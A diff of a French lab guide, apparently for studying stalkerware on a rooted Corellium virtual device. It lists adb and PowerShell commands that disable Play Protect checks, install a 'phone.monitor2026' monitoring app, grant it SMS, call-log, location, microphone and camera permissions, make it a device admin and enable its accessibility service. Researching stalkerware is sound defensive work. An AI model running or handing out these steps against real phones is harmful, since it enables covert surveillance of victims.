@@ -181,7 +181,6 @@ uv run python mtf_c2_server.py
 ### 5.1 Désactiver Play Protect (comme le ferait l'abuseur)
 
 ```bash
-# Via ADB (Corellium est déjà rooté)
 adb shell settings put global package_verifier_enable 0
 adb shell settings put global verifier_verify_adb_installs 0
 ```
@@ -189,12 +188,10 @@ adb shell settings put global verifier_verify_adb_installs 0
 ### 5.2 Installer le payload directement (sans dropper)
 
 ```bash
-# Push l'APK
 adb install phone.monitor2026.apk
 
 # Ou via le dropper pour tester la chaîne complète :
 adb install com.mtf.protect.apk
-# → Suivre le flow du dropper sur la VM
 ```
 
 ### 5.3 Accorder les permissions
@@ -202,7 +199,6 @@ adb install com.mtf.protect.apk
 ```bash
 PKG="phone.monitor2026"
 
-# Permissions runtime critiques
 for PERM in \
   android.permission.READ_SMS \
   android.permission.RECEIVE_SMS \
@@ -216,26 +212,40 @@ for PERM in \
   android.permission.READ_PHONE_STATE \
   android.permission.READ_CALENDAR \
   android.permission.READ_EXTERNAL_STORAGE \
+  android.permission.WRITE_EXTERNAL_STORAGE \
   android.permission.POST_NOTIFICATIONS \
   android.permission.READ_MEDIA_IMAGES \
   android.permission.READ_MEDIA_VIDEO ; do
     adb shell pm grant $PKG $PERM 2>/dev/null
 done
 
-# Battery optimization whitelist
 adb shell dumpsys deviceidle whitelist +$PKG
-
-# Device Admin (le stalkerware le fait via UI, mais en root on peut forcer)
 adb shell dpm set-active-admin $PKG/com.app.received.PolicyActivate\$PolicyAdmin
 ```
+
+```powershell
+$PKG = "phone.monitor2026"
+
+$PERMS = @(
+  "READ_SMS","RECEIVE_SMS","SEND_SMS","READ_CALL_LOG","READ_CONTACTS",
+  "ACCESS_FINE_LOCATION","ACCESS_BACKGROUND_LOCATION","RECORD_AUDIO","CAMERA",
+  "READ_PHONE_STATE","READ_CALENDAR","READ_EXTERNAL_STORAGE","WRITE_EXTERNAL_STORAGE",
+  "POST_NOTIFICATIONS","READ_MEDIA_IMAGES","READ_MEDIA_VIDEO"
+)
+foreach ($P in $PERMS) { adb shell pm grant $PKG "android.permission.$P" }
+
+adb shell dumpsys deviceidle whitelist +$PKG
+adb shell 'dpm set-active-admin phone.monitor2026/com.app.received.PolicyActivate$PolicyAdmin'
+```
+
+⚠️ Le `$PolicyAdmin` doit arriver **littéral** jusqu'au device : en bash on échappe (`\$`),
+en PowerShell on met la commande entière en quotes simples.
 
 ### 5.4 Activer l'AccessibilityService
 
 ```bash
-# Activer l'AccessibilityService (nécessaire pour l'interception IM no-root)
 adb shell settings put secure enabled_accessibility_services \
   $PKG/com.app.service.AccessService
-
 adb shell settings put secure accessibility_enabled 1
 ```
 
